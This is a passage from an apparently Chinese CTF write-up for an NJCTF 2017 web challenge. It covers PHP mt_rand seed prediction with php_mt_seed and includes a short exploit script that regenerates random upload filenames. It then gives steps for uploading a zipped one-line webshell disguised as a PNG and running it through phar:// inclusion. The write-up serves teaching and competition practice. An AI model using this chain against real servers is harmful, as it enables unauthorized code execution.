class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($check2) show_error_message(<span class="string">"Nope!"</span>);</div><div class="line">    <span class="keyword">if</span> ($check1) &#123;</div><div class="line">        $filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</div><div class="line">            show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</div><div class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="0x02-php随机数安全性分析"><a href="#0x02-php随机数安全性分析" class="headerlink" title="0x02 php随机数安全性分析"></a>0x02 php随机数安全性分析</h3><p>从源码中，可以发现两个关键函数rand()函数和mt_rand()函数，在php中，说道rand()函数和mt_rand()函数，就不得不说与他们相对应的两个播种随机数种子的函数，srand（）和mt_srand()，</p>
<p>看如下测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">123456</span>);</div><div class="line">srand(<span class="number">123</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"rand函数在种子是123456时产生的随机数序列:\n"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">5</span>;$i++)&#123;</div><div class="line">    <span class="keyword">echo</span> rand().<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"mt_rand函数在种子是123456时产生的随机数序列:\n"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">5</span>;$i++)&#123;</div><div class="line">    <span class="keyword">echo</span> mt_rand().<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170320172308.png" alt=""><br>测试发现无论是rand()函数还是mt_rand()函数，当随机数种子相同时，无论运行多少次，产生的随机数序列都是一样的，故如我们在代码中自己播种了随机的种子，但是泄露了这个种子，就会导致产生的随机数序列被别人猜到，进而造成安全问题。</p>
<p>在php&gt;4.2.0版本中，不再需要手动用stand()或mt_srand()函数给随机数发生器播种了，已自动完成，也就是随机数的种子不用我们给了，php会自动播种一个种子，这样子就不存在种子泄露问题了，这样就完全了吗？其实并不然</p>
<p>PHP7.1 mt_rand已经变好了，本来php的随机数就不应该用在加密解密上，甚至都不应该自己写加密解密的方法。php5里最优的方法应该是用openssl，php7以后php会加自己的加密解密库。</p>
<p>看下面：</p>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170320175851.png" alt=""><br>在kali系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647,<br>正好是 2^31-1 , 也就是说随机播种的种子也是在这个范围中,0 – 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢,有大牛已经用c写了一个爆破种子程序php_mt_seed，<a href="http://files.cnblogs.com/files/iamstudy/php_mt_seed-3.2.tar.gz" target="_blank" rel="external">预测种子的工具</a></p>
<p>演示一下它的基本用法<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321195608.png" alt=""><br>在演示例子中，让php自动播种一个种子并产生一个随机数，然后用php_mt_seed这个工具把产生的随机数作为参数，去爆破种子，最后得到三个结果，经验证，三个结果只有前两个是正确的，但是都会产生这样一个随机数</p>
<p>php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要.</p>
<p>做一下测试：<br><img src="" alt=""><br>在测试中，在没有进行手工播种的情况下产生两个连续的随机数，然后去爆破种子，得到了四个可能的种子，经过测试发现其中一个种子产生的随机数序列和预期的相同，故可以猜想在php中产生一些列的随机数时，只进行了一次播种</p>
<p>考虑下面代码安全性<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321152106.png" alt=""><br>我们能否根据公开的key，猜到$private？下面演示破解国称，首先获得public key在每一位字符串中的位置：<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321152643.png" alt=""><br>然后用php_mt_seed进行破解<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321202517.png" alt=""><br>成功破解了一个seed，测试：<br><img src="http://i4.buimg.com/567571/1ad0db77b4747962.png" alt=""><br>这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了.</p>
<h3 id="言归正传"><a href="#言归正传" class="headerlink" title="言归正传"></a>言归正传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></div><div class="line">&#123;</div><div class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</div><div class="line">    $str = <span class="string">''</span>;</div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">        $str .= $set[$ch];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line">session_start();</div><div class="line"> </div><div class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</div><div class="line">mt_srand($seed);</div><div class="line">$ss = mt_rand();</div><div class="line">$hash = md5(session_id() . $ss);</div><div class="line">setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</div><div class="line"> </div><div class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>我们的目标是猜测出filename.<br>这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了.</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">831237446</span>);</div><div class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"\n\r"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</div><div class="line">  $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">    <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">    <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">    <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">    <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</div><div class="line">  $str = <span class="string">''</span>;</div><div class="line"></div><div class="line">  <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">    $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">    $str .= $set[$ch];</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> random_str().<span class="string">"\n\r"</span>;</div></pre></td></tr></table></figure>
<h3 id="具体实现步骤"><a href="#具体实现步骤" class="headerlink" title="具体实现步骤"></a>具体实现步骤</h3><p>观察之后发现我们如果有文件名，我们可以通过将木马压缩进zip包，然后上传该zip文件(改成Png后缀上传)，利用phar伪协议包含执行命令。 所以我们的核心就是搞到文件名，即想办法搞到$seed。 这里我将一句话写进0.php，压缩之后改名为0.png上传 然后至于这里的session_id()，我们通过设置Cookie: PHPSESSID=;就能让它为空，所以得到随机数的md5，解开后的值为78503716<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321211752.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321212919.png" alt=""><br>生成文件名的前一部分为YQO4DMVYN25oxMabf9t5UBKnngcPQf2y，加上我们上传的0.png,所以完整的文件路径利用exp为/uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png，然后访问 <a href="http://218.2.197.235:23735/?page=phar://uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png/0，最后执行命令即可拿到flag。" target="_blank" rel="external">http://218.2.197.235:23735/?page=phar://uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png/0，最后执行命令即可拿到flag。</a> 如下：<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321213638.png" alt=""></p>
<p>###参考链接<br><a href="http://bendawang.site/article/NJCTF-2017-web-Writeup" target="_blank" rel="external">http://bendawang.site/article/NJCTF-2017-web-Writeup</a></p>
<blockquote>
<p><a href="http://www.cnblogs.com/iamstudy/articles/2017_NJCTF_Some_Web_Writeup.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/2017_NJCTF_Some_Web_Writeup.html</a></p>
<p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=585</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-获取源码&quot;&gt;&lt;a href=&quot;#0x01-获取源码&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取源码&quot;&gt;&lt;/a&gt;0x01 获取源码&lt;/h3&gt;&lt;p&gt;利用php的协议php://filter获取源码，具体方法：&lt;code&gt;php://filter/convert.base64-encode/resource=upload&lt;/code&gt;，读到源码，然后base64解密&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;show_error_message&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($message)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&amp;gt;&amp;lt;/i&amp;gt;$message&amp;lt;/div&amp;gt;&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;show_message&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($message)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;div class=\&quot;msg success\&quot; id=\&quot;message\&quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&amp;gt;&amp;lt;/i&amp;gt;$message&amp;lt;/div&amp;gt;&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;random_str&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($length = &lt;span class=&quot;string&quot;&gt;&quot;32&quot;&lt;/span&gt;)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $set = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;A&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;b&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;B&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;c&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;C&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;d&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;D&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;e&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;E&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;f&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;F&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;g&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;G&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;h&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;H&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;i&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;I&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;j&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;J&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;k&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;K&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;l&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;L&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;M&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;N&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;o&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;O&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;p&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;P&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;q&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Q&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;r&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;R&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;s&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;S&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;t&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;T&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;u&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;U&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;v&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;V&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;w&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;W&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;x&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;X&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;y&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Y&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;z&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Z&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;2&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;3&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;4&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;5&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;6&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;7&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;8&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;9&quot;&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//61&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $str = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ($i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; $i &amp;lt;= $length; ++$i) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $ch = mt_rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, count($set) - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $str .= $set[$ch];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;$ch&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; $str;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;session_start();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$reg=&lt;span class=&quot;string&quot;&gt;&#39;/gif|jpg|jpeg|png/&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt;])) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $seed = rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;999999999&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    mt_srand($seed);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $ss = mt_rand();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $hash = md5(session_id() . $ss);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    setcookie(&lt;span class=&quot;string&quot;&gt;&#39;SESSI0N&#39;&lt;/span&gt;, $hash, time() + &lt;span class=&quot;number&quot;&gt;3600&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;] &amp;gt; &lt;span 